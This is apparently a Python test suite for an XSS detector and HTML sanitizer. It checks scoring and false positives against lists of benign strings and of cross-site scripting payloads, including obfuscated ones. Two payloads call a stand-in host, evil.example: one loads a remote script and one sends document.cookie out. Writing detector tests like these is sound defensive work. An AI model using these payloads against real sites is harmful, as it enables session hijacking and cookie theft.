import unittest

from xss_detector import escape_html, safe_url, scan
from xss_detector.detector import XSSDetector, level_for

MALICIOUS = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<<script>alert(1);//<</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
    "' onmouseover='alert(1)",
    '<a href="javascript:alert(1)">x</a>',
    '<a href="jav&#x09;ascript:alert(1)">x</a>',
    "<a href=\"java\tscript:alert(1)\">x</a>",
    "javascript:alert(1)",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<div style="background:url(javascript:alert(1))">',
    "<div style=\"width:expression(alert(1))\">",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    '<img src="x" onerror="&#97;lert(1)">',
    "<img src=x onerror=\\u0061lert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "{{constructor.constructor('alert(1)')()}}",
    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<script src=//evil.example/x.js></script>",
    "<script>fetch('//evil.example/?c='+document.cookie)</script>",
    "<a href=x onclick/**/=alert(1)>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
]

BENIGN = [
    "Hello, my name is John O'Brien.",
    "I <3 programming & coffee",
    "5 < 10 and 10 > 5",
    "if a < script_length then stop",
    "Please confirm your order (12345)",
    "email me at john@example.com",
    "https://example.com/path?q=search&lang=en",
    "The onclick event is commonly used in web pages.",
    "a = b + c",
    "100% sure, 50%25 off",
    "SELECT * FROM users WHERE id = 1",
    "I love JavaScript: The Good Parts",
    "Tom & Jerry &amp; friends",
    "C:\\users\\public\\documents",
    "",
    "Line one\nLine two\twith tab",
    "Café résumé naïve 日本語",
]


class DetectorTests(unittest.TestCase):
    def test_malicious_payloads_are_flagged(self):
        for payload in MALICIOUS:
            with self.subTest(payload=payload):
                result = scan(payload)
                self.assertTrue(result.is_malicious, f"missed: {payload!r} score={result.score}")

    def test_benign_inputs_are_not_flagged(self):
        for text in BENIGN:
            with self.subTest(text=text):
                result = scan(text)
                self.assertFalse(result.is_malicious,
                                 f"false positive: {text!r} -> {[f.rule_id for f in result.findings]}")

    def test_benign_empty_and_none(self):
        self.assertEqual(scan("").score, 0)
        self.assertEqual(scan(None).level, "safe")
        self.assertEqual(scan(12345).score, 0)

    def test_classic_payload_is_critical(self):
        result = scan("<script>alert(1)</script>")
        self.assertEqual(result.level, "critical")
        self.assertEqual(result.score, 90)
        self.assertEqual(result.findings[0].rule_id, "XSS001")

    def test_encoding_is_reported(self):
        result = scan("%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertGreaterEqual(result.decode_layers, 1)
        self.assertIn("XSS099", [f.rule_id for f in result.findings])
        self.assertIn("<script>", result.decoded)

    def test_plain_payload_has_no_obfuscation_finding(self):
        self.assertNotIn("XSS099", [f.rule_id for f in scan("<script>alert(1)</script>").findings])

    def test_score_capped_at_100(self):
        payload = "<script>alert(document.cookie);eval(x);document.write(1)</script><iframe onload=alert(1)>"
        self.assertEqual(scan(payload).score, 100)

    def test_custom_threshold(self):
        strict = XSSDetector(block_threshold=1)
        self.assertTrue(strict.scan("please confirm (yes)").is_malicious)
        lenient = XSSDetector(block_threshold=95)
        self.assertFalse(lenient.scan("<script>alert(1)</script>").is_malicious)

    def test_scan_fields(self):
        results = XSSDetector().scan_fields({"name": "Ada", "bio": "<script>x</script>"})
        self.assertFalse(results["name"].is_malicious)
        self.assertTrue(results["bio"].is_malicious)

    def test_levels(self):
        self.assertEqual([level_for(s) for s in (0, 1, 24, 25, 49, 50, 74, 75, 100)],
                         ["safe", "low", "low", "medium", "medium", "high", "high", "critical", "critical"])

    def test_large_hostile_input_is_fast(self):
        import time
        for blob in ("{{" * 100_000, "j " * 100_000, "/*" * 100_000, "<" * 200_000, "&" * 200_000):
            start = time.perf_counter()
            scan(blob)
            self.assertLess(time.perf_counter() - start, 3.0, f"slow on {blob[:6]!r}")


class SanitizerTests(unittest.TestCase):
    def test_escape_html(self):
        self.assertEqual(escape_html("<a href=\"x\" onclick='y'>`"),
                         "&lt;a href=&quot;x&quot; onclick=&#x27;y&#x27;&gt;&#96;")
        self.assertEqual(escape_html(None), "")

    def test_safe_url(self):
        self.assertEqual(safe_url("https://example.com/a"), "https://example.com/a")
        self.assertEqual(safe_url("/relative/path"), "/relative/path")
        self.assertIsNone(safe_url("javascript:alert(1)"))
        self.assertIsNone(safe_url("java\tscript:alert(1)"))
        self.assertIsNone(safe_url("data:text/html,x"))
        self.assertIsNone(safe_url(""))


if __name__ == "__main__":
    unittest.main()
